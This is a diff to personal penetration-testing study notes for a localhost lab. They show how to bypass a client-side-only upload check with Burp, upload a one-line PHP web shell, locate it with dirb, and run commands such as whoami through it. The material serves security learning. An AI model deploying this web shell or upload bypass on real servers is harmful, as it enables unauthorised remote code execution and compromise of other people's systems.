@@ -2396,8 +2396,55 @@ check the calls to the webserver:
 	- put some text instead 
 	- change the filename to -->  .txt
 	- click Send
+	  ![[Pasted image 20240309104829.png]]
 	  =>
 		- <span style="color:#00b050">we obtain 200 OK</span> and into the response there is the mex -->  "file is been uploaded"
 		- you can check by refreshing the page
 		  =>
-		  THE CHECK IS PERFORMED ONLY CLIENT SIDE   (here we could sent the .txt)
+		  <span style="color:#00b050">THE CHECK IS PERFORMED ONLY CLIENT SIDE</span>   (here we could sent the .txt)
+=>
+we can:
+- create a PHP web shell
+- upload it into the webserver
+
+###### PHP shell
+Now -->  instead of sending random text with burp =>  we send a php shell
+=>
+`<?php system($_GET['cmd']); ?>`
+`$_GET` -->  this is going to get the value of the parameter inside the `[]` and send a GET request
+`system()` -->  function that executes what it has inside
+
+also:
+we need to change the file type of our new req:
+`cmd.php` -->  bc the file that we want to upload must be executable
+![[Pasted image 20240309104930.png]]
+
+let's send this:
+=>
+	<span style="color:#00b050">we obtain 200 OK and the file is been uploaded</span>   (check by refreshing the page)
+now:
+<span style="background:#fff88f">we need to find where this file is been uploaded</span>
+=>
+we can do:
+-  <span style="color:#00b050">guessing</span>
+   you can inspect the code to see where the other img in the webserver are stored
+   ![[Pasted image 20240309103801.png]]
+   =>
+   let's try to see if the img is in -->  http://localhost/assets/cmd.php
+   NO is not here
+-  directory busting (ex [[cheet#dirb]])
+   `dirb  http://localhost/`
+   ![[Pasted image 20240309104419.png]]
+   =>
+   inside `labs` there is a directory -->  `uploads`
+   =>
+   let's try -->  http://localhost/labs/uploads/cmd.php
+   ![[Pasted image 20240309105028.png]]
+   _<span style="color:#00b050">It works</span> 
+   We got an error bc -->  <span style="background:#fff88f">we didn't pass the parameter cmd with a value</span>
+   =>
+   `http://localhost/labs/uploads/cmd.php?cmd=whoami`
+   ![[Pasted image 20240309105301.png]]
+   =>
+   _<span style="color:#00b050">WE PERFORMED CODE EXECUTION</span> 
+
